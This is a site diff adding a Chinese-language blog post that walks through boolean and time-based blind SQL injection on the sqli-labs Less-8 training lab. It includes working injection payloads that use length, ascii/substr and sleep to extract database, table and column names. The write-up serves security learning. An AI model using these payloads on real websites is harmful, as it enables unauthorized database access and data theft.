@@ -176,7 +176,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-count">3</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -211,6 +211,181 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/private/icon1.png">
+      <meta itemprop="name" content="Byron">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Byron">
+      <meta itemprop="description" content="Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Byron">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/" class="post-title-link" itemprop="url">Boolean and Time-blind-Injection</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-07-09 22:00:00" itemprop="dateCreated datePublished" datetime="2026-07-09T22:00:00+08:00">2026-07-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-07-13 15:28:03" itemprop="dateModified" datetime="2026-07-13T15:28:03+08:00">2026-07-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/" itemprop="url" rel="index"><span itemprop="name">web-security</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/sql-injection/" itemprop="url" rel="index"><span itemprop="name">sql-injection</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>Environment: PHP 7.3.4 + MySQL 5.7.26</p>
+</blockquote>
+<blockquote>
+<p>Lab: sqli-labs Less-8</p>
+</blockquote>
+<hr>
+<h2 id="1-0-布尔盲注-延时盲注函数"><a href="#1-0-布尔盲注-延时盲注函数" class="headerlink" title="1.0 布尔盲注&amp;延时盲注函数"></a>1.0 布尔盲注&amp;延时盲注函数</h2><p><strong>在布尔注入及延时注入中, 常用函数如下:</strong></p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>函数</th>
+<th>注释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>if(条件,返回值1,返回值2)</td>
+<td>判断条件, 若为真返回(返回值1), 否则为返回值2</td>
+</tr>
+<tr>
+<td>2</td>
+<td>substr(str,1,2)</td>
+<td>从第1位开始截取’str’的长度为2 (st)</td>
+</tr>
+<tr>
+<td>3</td>
+<td>length(database())&#x3D;8</td>
+<td>判断数据库名称长度是否为8</td>
+</tr>
+<tr>
+<td>4</td>
+<td>ascii(s)&#x3D;115</td>
+<td>判断字母’s’编码是否为115</td>
+</tr>
+<tr>
+<td>5</td>
+<td>sleep(n)</td>
+<td>延时输出结果,n为秒数</td>
+</tr>
+</tbody></table>
+<hr>
+<p><strong>手工注入流程(布尔盲注):</strong></p>
+<p><strong>01 判断数据库字符长度</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length(database())=8 --+</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/1.png"></p>
+<blockquote>
+<p>当前数据库名长度&#x3D;8</p>
+</blockquote>
+<p><strong>02 猜解数据库名,(采用ascii编码)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr(database(), 1,1))=115 --+</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/2.png"></p>
+<blockquote>
+<p>猜测正确,第一位确实为 ‘115’, 小写字母 ‘s’, 继续猜剩余7位即可</p>
+</blockquote>
+<p><strong>03 猜解表名长度</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/3.png"></p>
+<blockquote>
+<p>当前数据库第一个表, 表名长度&#x3D;6</p>
+</blockquote>
+<p><strong>04 猜解数据表名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1), 1,1))=114 --+</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/4.png"></p>
+<blockquote>
+<p>当前库第一个表,第一个字母并非 ‘114’ , ‘r’</p>
+</blockquote>
+<p><strong>05 猜解列名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1), 1,1))=114 --+</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/5.png"></p>
+<blockquote>
+<p>users 表中第一个字段首字母并非 ‘114’,’r’</p>
+</blockquote>
+<p>…</p>
+<p>盲注每一步都需要猜解大量字符, 以上是标准Payload, 实际过程中使用二分法思路结合ASCII编码进行.</p>
+<p><strong>延时盲注:</strong></p>
+<p>延时盲注即在布尔盲注的语句中添加条件判断if (IF(条件, sleep(秒数), 0)) , 标准格式如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(length(database())=8,sleep(3),0)--+</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/6.png"></p>
+<p>以上语句为真, 执行sleep(3) , 如上图, 浏览器会有加载标识</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
